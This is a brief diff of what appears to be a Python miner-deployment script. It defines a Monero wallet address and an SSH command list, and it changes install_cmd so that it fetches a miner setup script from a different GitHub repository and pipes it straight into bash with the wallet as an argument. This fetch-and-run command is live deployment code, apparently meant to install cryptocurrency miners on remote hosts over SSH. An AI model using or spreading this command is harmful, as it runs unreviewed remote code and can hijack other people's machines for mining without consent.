@@ -27,7 +27,7 @@ xmr_addy = '47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf
 # Do not edit below this line
 # ===========================================================================================================================================
 
-install_cmd = "curl -s -L https://raw.githubusercontent.com/TheCookies/MO-Miner/master/start.sh | bash -s " + xmr_addy
+install_cmd = "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie.sh | bash -s " + xmr_addy
 sshcmd = [
     install_cmd # Runs the setup command
 ]
